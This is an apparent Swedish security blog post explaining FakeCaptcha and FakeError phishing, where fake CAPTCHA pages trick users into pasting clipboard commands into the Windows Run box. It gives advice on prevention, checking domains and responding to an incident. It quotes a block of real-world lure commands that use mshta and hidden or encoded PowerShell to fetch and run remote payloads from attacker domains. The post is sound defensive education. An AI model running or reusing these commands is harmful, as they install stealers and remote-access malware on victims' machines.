---
layout: post
title: ""
categories: [blogpost]
tags: [FakeCaptcha, Phishing, PowerShell]
render_with_liquid: false
image: assets/img/phish_cam_1-768x768.jpeg
---

<!--more-->

{% raw %}
## Fakecaptcha
Denna blogg kommer innehålla kortfattad information som jag har hittat om FakeCaptcha‑phishing.


FakeCaptcha är en phishingmetod som använder CAPTCHA för att lura användarna att själva skriva in illvillig PowerShell‑kod på sin dator.
Hemsidan visar en falsk CAPTCHA och för att komma vidare till den "riktiga hemsidan" måste man bevisa att man inte är en robot genom att följa instruktionerna.

![Fakecaptchaps1](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/e/unmasking-fake-captcha-cases-in-mxdr-investigations/Fig-10.png)

<video controls width="100%" preload="metadata">
  <source src="{{ '/assets/video/Fakecaptcha.mp4' | relative_url }}" type="video/mp4">
  Din webbläsare stödjer inte video.
</video>

Instruktionerna
1. WIN + R            -- Öppnar Run‑rutan i Windows
2. CTRL + V           -- Klistrar in en illvillig PowerShell‑kod i Run‑rutan
3. Enter              -- För att köra koden i Run


Om du undrar hur koden blev kopierad från början är det för att användaren tryckte "I'm not a robot" eller "Verify" först, innan instruktionerna dök upp.
Den kopieras i smyg utan användarens kunskap.

Som bilden visar nedanför försöker hackarna ge användarna en falsk trygghet genom att bara visa en del av PowerShell‑koden som ser ut att vara äkta.



![Fakecaptchaps1](https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/03/run_command.jpg)



Nedanför finns exempel på hur PowerShell‑koden kan se ut.



```
mshta.exe hxxps://ernier[.]shop/lyricalsync[.]mp3 # ''Î™ am nÎ¿t a rÎ¿bÎ¿t: Ð¡ÐÐ Ð¢Ð¡ÐÐ Verification UID: 885203

mshta.exe hxxps://zb-files[.]oss-ap-southeast-1[.]aliyuncs[.]com/DPST_doc.mp3 #  ''Î™ am nÎ¿t a rÎ¿bÎ¿t: Ð¡ÐÐ Ð¢Ð¡ÐÐ Verification UID: 815403

mshta.exe hxxp://ok[.]fish-cloud-jar[.]us/ # "Authentication needed: Secure Code 3V8MUR-9PW4S"

mshta.exe hxxps://yedik[.]shop/Tech_House_Future[.]mp3 #  ''Î™ am nÎ¿t a rÎ¿bÎ¿t: Ð¡ÐÐ Ð¢Ð¡ÐÐ Verification UID: 885203

mshta.exe hxxps://x63-hello[.]live/nF3mXcQ9FVjs1sMt[.]html #'' I'm human ID241619''

mshta.exe hxxps://welcome12-world[.]com/wpDoQRpZt2PIffud[.]html #'' I'm human ID233560''

mshta.exe hxxps://w19-seasalt[.]com/mbDjBsRmxM1LreEp[.]html #'' I'm human ID984662''

PowerShell.exe -W Hidden -command $uri = 'hxxps[://]fessoclick[.]com/clck/dub.txt'; $content = (Invoke-WebRequest -Uri $uri).Content; Invoke-Expression $content"

cmd /c "powershell -w h -e aQBlAHgAKABpAHcAcgAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwB2AGkAZQB3AGUAcgAtAHYAYwBjAHAAYQBzAHMALgBjAG8AbQAvAGkAbgAuAHAAaABwAD8AYQBjAHQAaQBvAG4APQAxACcAKQA=" && ✅ I am not a robot - reCAPTCHA ID: 7845

mshta hxxps://check[.]nejyd[.]icu/gkcxv[.]google?i=db47f2d4-a1c2-405f-ba9f-8188d2da9156 REM ✅ Human, not a robot: Verification Ð¡ÐÐ TCHA ID:658630

PoWeRsHeLl -w h -c cUr"L.E"x"E" -k -L
hxxp"s://ka"j"e"c.icu"/f"04b18c2f7ff"48bdbf06"701"38"f9eb2"4f.txt | pow"e"rs"h"el"l" -

```


Ett av hackarnas mål är att få användarna att tro att hemsidan och instruktionerna är äkta. Det gör de genom att ändra domännamnet till något som ser äkta ut. Ofta använder de populära hemsidor som Facebook eller Microsoft. 

Som bilden visar nedanför gör de bakgrunden till den riktiga hemsidan suddig.

![FakeCaptcha](https://www.york.ac.uk/media/it-services/images/about/news/2025/Fake%20captcha,%20full%20browser.png)

## FakeError

Fake error är i princip samma sak som FakeCaptcha, men skillnaden är att den spelar på användarens rädsla att något har gått fel.
För att övertyga användaren mer låser hemsidan sig själv i fullskärm.
Exempel på FakeError nedanför.



![FakeErrorBild](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlFgZ371OJLB7x0fK_3a34h710DpAHQLeyLQyaBpp1jhfsFyRD0-tmkLhXAvv0VD1XnU_WK8g5O16VUob1aHIyQf2smhkn6llIaC_H5_6MwogFRD11Hfp-w2kPc9vgiBUTlnftXM7VuCMsFmBPwxtyvAokqOJbgSAndESDU3qZV6-R9SH6meqbyuyoFk8n/s1600-e365/windows.jpg)



## Initial Access
En lista över hackarnas olika sätt att sprida FakeCaptcha/FakeError‑hemsidorna
- Äkta sidor som ersätts av FakeCaptcha / FakeError
- Malvertising / SEO-poisoning
- Redirects
- Fake tech support / tutorials
- E‑post

## Stoppa FakeCaptcha innan det händer

### 1. Känn igen mönstret direkt
- CAPTCHA som säger **Win+R → Ctrl+V → Enter** = 99,9 % bluff  
- Samma sak med: "du är infekterad", "fixa fel nu", "verify human", "säkerhetsuppdatering" + instruktioner till Run eller Terminal

### 2. Avbryt korrekt (utan att köra något)
- Stäng fliken eller hela webbläsaren  
- Poppar helskärm eller blockerar? → **Alt+F4** / **Ctrl+W** / döda processen i Aktivitetshanteraren

### 3. Clipboard är fienden
De flesta varianter fyller urklippet med skadlig kommandorad.  
Vanor som räddar dig:
- Klistra **aldrig** in okänd text i Run / PowerShell / Terminal  
- Misstänker du manipulation? Kopiera ett enda ord (typ "test") först → då skriver du över skiten

### 4. Minska ytan
FakeCaptcha kommer oftast via malvertising, phishing eller hackade sajter.  
Gör det svårare:
- Håll webbläsare + OS uppdaterade  
- Använd uBlock Origin / reklamblockerare  
- Var allergisk mot "gratis filmer", torrent-sidor, "PC support"-popups, exempel på bilden nedanför.
![FakeErrorBild](https://its.uky.edu/sites/default/files/styles/max_650x650/public/2023-06/fake_microsoft_support_site.webp?itok=WAwygnyQ)

### 5. För företag / sysadmins
Vanliga FakeCaptcha‑kedjor använder LOLBins (living-off-the-land).  
Bra snabba wins:
- Logga / begränsa PowerShell (särskilt -EncodedCommand / -WindowStyle Hidden)  
- EDR‑regel: larma på explorer.exe → powershell.exe / mshta.exe med suspekt cmdline  
- Träna användare: "riktig CAPTCHA ber dig aldrig öppna Kör"

### 6. Redan kört kommandot? Paniksteg
1. Koppla ur nätet direkt  
2. Kör fullständig skanning (helst EDR eller bra AV)  
3. Byt lösenord från en **annan, ren** dator (särskilt mail, bank, Microsoft-konto etc)

## Är domänen legitim? Snabb koll

1. **Stavfel & trix**  
   micros0ft, micro-soft, rnicrosoft, -secure, -verify, .top, .xyz osv

2. **Vem äger egentligen domänen?**  
   login-microsoft.com → ägs av microsoft.com?  
   microsoft.login-verify.net → ägs av net? → nej, bluff

3. **Punycode / IDN-homoglyfer**  
   xn-- prefixed domän = ofta försök att se ut som apple.com / google.com

4. **HTTPS = inte tillräckligt**  
   Grönt hänglås betyder bara att certet är utfärdat. Phishingsidor har HTTPS också.

5. **Snabb rykteskoll**  
   - Slå in domänen i https://transparencyreport.google.com/safe-browsing/search  
   - Ny domän + “login” / “support” / “update” = hög risk

6. **Bästa vanan**  
   Lita aldrig på länken.  
   Skriv adressen själv eller gå via bokmärke.  
   Googla varumärket → skippa annonser högst upp.

7. **Beteendet avslöjar**  
   Stress (“konto låses om 3 minuter”),  
   ber om MFA-kod “för verifiering”,  
   vill att du kör kommando / ringer nummer / laddar ner “fix”

**Regel #1 att komma ihåg:**  
Om sidan ber dig köra något i Win+R / Terminal → stäng omedelbart. Det är FakeCaptcha.

Vill du att jag kollar en specifik domän?  
Klistra bara in **domännamnet** (inget mer) så kör jag checklistan och säger vad som är rött/grönt.

## Tricks hackarna har använt sig av

De använder även andra metoder för att förhindra att bli påkomna av säkerhetsföretagen genom att använda Cloudflare‑CAPTCHA på deras egna illvilliga hemsida, för att sedan hindra webbcrawlers från säkerhetsföretagen att hitta deras skadliga kod.



## Konsekvenserna
Virusen som installeras är oftast stealers eller RAT som sedan leder till kontokapning, bedrägeri eller kryptomining.



### Labbidé
Göra en enkel version av detta med hjälp av attack‑ och defend‑VM:er. 
Öppna Kalkylatorn på defend‑VM från attack‑VM. 

<video controls width="100%" style="max-width: 900px; border-radius: 10px;">
  <source src="{{ '/assets/video/Fakecaptcha.mp4' | relative_url }}" type="video/mp4" />
  Din webbläsare stödjer inte video-taggen.
</video>


![labbvideo](https://github.com/user-attachments/assets/4486e80d-eac8-4adb-b5b5-55b10517ade2)



## Referenser
````
https://any.run/cybersecurity-blog/new-phishing-tactics/

https://app.any.run/tasks/22b677ed-8ee9-4c25-81c0-fd9073540009/?
utm_source=anyrunblog&utm_medium=article_bottom&utm_campaign=newphishing11102023&utm_content=task

https://intelligence.any.run/analysis/lookup#{%22query%22:%22threatName:%5C%22qrcode%5C%22%22,%22dateRange%22:180}

https://pcriot.com.au/fake-cloudflare-win-r-malware-what-it-is-how-it-works-and-how-to-clean-your-site/

https://community.spiceworks.com/t/getting-out-of-scareware-when-its-full-screen-and-doesnt-respond-to-control-al/966997 -- hackarna
använder tvingat fullscreen för sin hemsida?

https://www.malwarebytes.com/blog/news/2025/03/fake-captcha-websites-hijack-your-clipboard-to-install-information-stealers

https://thehackernews.com/2025/08/FakeCaptcha-malware-campaign-exploits.html -- bra analys

https://unit42.paloaltonetworks.com/preventing-FakeCaptcha-attack-vecto
````
{% endraw %}

